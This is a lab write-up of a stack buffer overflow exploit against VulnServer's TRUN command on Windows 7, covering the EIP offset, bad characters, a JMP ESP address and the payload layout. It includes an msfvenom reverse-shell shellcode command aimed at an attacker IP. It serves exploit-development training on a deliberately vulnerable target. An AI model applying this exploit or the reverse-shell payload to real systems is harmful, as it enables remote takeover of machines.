# vulnApp-buffer-overflow

Title
# Windows Stack-Based Buffer Overflow Exploit (VulnServer Lab)

1️⃣ Overview
This project demonstrates exploitation of a stack-based buffer overflow
in the TRUN command of VulnServer (Windows 7 lab environment).

The goal was to achieve remote code execution by:

- Identifying crash conditions
- Calculating precise EIP overwrite offset
- Performing bad character analysis
- Locating a reliable JMP ESP instruction
- Injecting custom shellcode
  
2. Lab Environment
Target: VulnServer (32-bit)
OS: Windows 7
Debugger: Immunity Debugger + Mona
Attacker: Kali Linux
Language: Python 3
Payload: windows/shell_reverse_tcp

3. Exploitation Process
Step 1 — Fuzzing
Sent increasing buffer sizes to identify crash condition.
Application crashed when input exceeded expected buffer length.
Step 2 — Offset Discovery
Used pattern_create / pattern_offset to calculate precise EIP overwrite.
Offset identified: 2003 bytes.
Step 3 — Confirming EIP Control
Sent 2003 "A"s + "BBBB"
Confirmed EIP = 42424242
Step 4 — Bad Character Analysis
Tested bytes 0x01–0xff
Identified bad characters:
\x00
\x0a
\x0d
Step 5 — Finding JMP ESP
Used mona to locate JMP ESP in essfunc.dll
Selected: 0x62501203 (no ASLR, no SafeSEH)

Little endian:

\x03\x12\x50\x62
Step 6 — Final Payload Structure
buffer = (
    b"A"*2003 +
    jmp_esp +
    b"\x90"*16 +
    shellcode
)
Step 7 — Reverse Shell
Generated shellcode using msfvenom:

msfvenom -p windows/shell_reverse_tcp \
LHOST=<Kali_IP> \
LPORT=4444 \
-b "\x00\x0a\x0d" \
-f python

Successful reverse shell achieved via netcat listener.


---
4. What This Demonstrates
- Stack memory layout understanding
- Instruction pointer control
- Execution redirection via JMP ESP
- Impact of bad characters on payload integrity
- Fundamentals of exploit development

  
5️⃣ Disclaimer
This project was conducted in a controlled lab environment for educational purposes only.
